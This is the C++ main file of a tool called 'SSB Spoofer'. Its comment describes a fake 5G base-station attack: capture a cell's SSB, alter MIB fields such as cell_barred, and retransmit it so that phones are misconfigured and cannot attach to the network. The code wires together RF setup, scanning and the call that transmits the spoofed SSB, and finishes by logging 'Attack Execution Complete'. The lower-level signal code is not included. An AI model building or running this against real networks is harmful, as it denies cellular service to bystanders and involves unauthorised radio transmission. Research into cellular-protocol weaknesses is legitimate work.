/**
 * SSB Spoofer Main Application
 * 
 * This application performs a fake gNB attack by:
 * 1. Scanning for a legitimate SSB from a target gNB
 * 2. Decoding the MIB from the SSB
 * 3. Modifying key MIB parameters (cell_barred, coreset0_idx, etc.)
 * 4. Re-encoding and transmitting the modified SSB
 * 
 * This causes UE misconfiguration and prevents network attachment.
 */

#include "config.h"
#include "rf_handler.h"
#include "ssb_processor.h"
#include "app_core.h"
#include "logger.h"

#include <vector>
#include <csignal>

using namespace ssb_spoofer;

int main(int argc, char** argv) {
  // Print banner
  print_banner();
  
  // Parse command line arguments
  std::string config_file = "config.yaml";
  
  for (int i = 1; i < argc; i++) {
    std::string arg = argv[i];

    if (arg == "-h" || arg == "--help") {
      print_usage(argv[0]);
      return 0;

    } else if (arg == "-c" || arg == "--config") {
      if (i + 1 < argc) {
        config_file = argv[++i];
      } else {
        LOG_ERROR("Error: -c option requires an argument");
        return 1;
      }

    } else {
      LOG_ERROR("Error: Unknown option %s", arg.c_str());
      print_usage(argv[0]);
      return 1;
    }
  }
  
  // Setup signal handlers
  std::signal(SIGINT, signal_handler);
  std::signal(SIGTERM, signal_handler);
  
  // Load configuration
  LOG_DEBUG(">> Loading configuration from: %s", config_file.c_str());

  Config config;
  if (!ConfigParser::load_from_file(config_file, config)) {
    LOG_ERROR("  ERROR: Failed to load configuration");
    return 1;
  }
  
  ConfigParser::print(config);
  
  // Initialize RF handler
  LOG_DEBUG(" --------------------------------------------------------");
  LOG_DEBUG("            Initializing RF Device");
  LOG_DEBUG("  --------------------------------------------------------");

  RfHandler rf;
  if (!rf.init(config.rf)) {
    LOG_ERROR("  ERROR: Failed to initialize RF device");
    return 1;
  }
  
  // Initialize SSB processor
  LOG_DEBUG(" --------------------------------------------------------");
  LOG_DEBUG("            Initializing SSB Processor");
  LOG_DEBUG("  --------------------------------------------------------");

  SsbProcessor ssb_proc;
  if (!ssb_proc.init(config.ssb, config.rf.srate_hz, config.rf.rx_freq_hz)) {
    LOG_ERROR("  ERROR: Failed to initialize SSB processor");
    return 1;
  }
  
  // Scan for target SSB
  SsbSearchResult ssb_result;

  if (!scan_for_ssb(rf, ssb_proc, config, ssb_result)) {
    LOG_ERROR(" --------------------------------------------------------");
    LOG_ERROR("            Failed to find target SSB");
    LOG_ERROR("  --------------------------------------------------------");
    LOG_ERROR("    Suggestions:");
    LOG_ERROR("    - Check RF configuration (frequency, gain, etc.)");
    LOG_ERROR("    - Verify target gNB is transmitting");
    LOG_ERROR("    - Try increasing scan duration");
    LOG_ERROR("  --------------------------------------------------------");

    return 1;
  }
  
  // Transmit spoofed SSB
  if (!transmit_spoofed_ssb(rf, ssb_proc, config, ssb_result)) {
    LOG_ERROR("  ERROR: Failed to transmit spoofed SSB");
    return 1;
  }
  
  LOG_DEBUG("\n  ======================================================================");
  LOG_DEBUG("                     Attack Execution Complete");
  LOG_DEBUG("  ======================================================================");
  LOG_DEBUG("\n");
  
  return 0;
}
